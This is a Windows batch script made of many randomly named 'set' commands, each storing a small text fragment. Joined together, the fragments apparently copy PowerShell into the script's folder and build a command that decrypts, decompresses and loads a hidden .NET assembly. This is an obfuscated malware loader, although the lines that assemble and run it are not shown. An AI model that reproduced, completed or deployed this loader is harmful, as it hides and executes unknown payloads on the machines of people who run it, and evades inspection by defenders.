@echo off
set "dAuIHmzQxv=rS"
set "HCReQlhFqj=po"
set "IgNGZCrJZN=he"
set "KQfASEZlkA=Po"
set "oABAAcAIkW=xe"
set "nrlSwOWuqQ=.e"
set "flLppapDVX=:\"
set "QTFxNaXGeQ=rs"
set "toZdZtEXZt=ll"
set "fiNPZjDLrC=1."
set "rTgfWAyyMS=st"
set "ztouZxOJAL= C"
set "yiYiMZvSEe=in"
set "BmIhLryRnI=ws"
set "bNdpQzNRAZ=ow"
set "KOpuCrUVkk=y "
set "EpwZFkwwTG=\v"
set "joojzkBjeQ=we"
set "oCNDsAhWVJ=Wi"
set "mTTsotIvwQ=nd"
set "BEEVtFLiQE=he"
set "TSkqOTyxdv= /"
set "MWQwnPwEaW=co"
set "NYtXAjZmPE=32"
set "pRNRzmrsaW=Sy"
set "wQIIjtzjEN=do"
set "MpvVmvPBJr=em"
set "wQdsJXGKbz=s\"
set "NhHLirMiuo=we"
set "GEsQUPBqJn=0\"
set "LygQaMuZpX=py"
set "cXvitspirJ=ll"
set "hvREIDKYvi=\W"
set "jZeUWgeRgM=cd"
set "JCrdJrCRZi= %~dp0"
set "EUrYXDtxqP= = $"
set "mpTzciyhsn=ke($"
set "pKjuGTCpPD=ne);"
set "CVvIJULgel=y.Cr"
set "KuvLAlOQRc=esFX"
set "MOQsMqDGHf=.Len"
set "kqYcLFzqXZ===')"
set "LrqEkJFhQO= New"
set "XjgBriaJsh=]::("
set "WBgQxKrZQl=] -j"
set "djwfHolCVa=ress"
set "hYuZmEXPrb=stem"
set "ElFXSvpbaN=ress"
set "dyzEqdeCMS=Vr.T"
set "KwIpwyDsUM='')("
set "npJoDvTwcl=();$"
set "ArueCATQtZ=UGTu"
set "DBwIZctLXp=();$"
set "SFbNnGHqho=3HWs"
set "OTPtvVXllf=gNyZ"
set "cBPVHTtCQF=);$X"
set "CLXZSVyXLh=;$Zo"
set "CECkIRJYvD=.Dis"
set "AOkmckUavH=ose("
set "oDjHOeFnSN=thcH"
set "bkVabuLfoR=ew-O"
set "OmVvpPsQKV=embl"
set "plysWGUCqC=in $"
set "KnYAfPOIQW=aAsU"
set "JDQrdsnfvD=EVr."
set "juhmmlNMOw=H = "
set "LgndgVtDpT=.Dis"
set "YjZpdKvSOR== $G"
set "YjMUHACsgJ=vY ="
set "jRgYbEOqAq='[-1"
set "QGhHkdFRFd=ptog"
set "SWVeDeeQoq=O.Me"
set "LhByoviLyp=S46e"
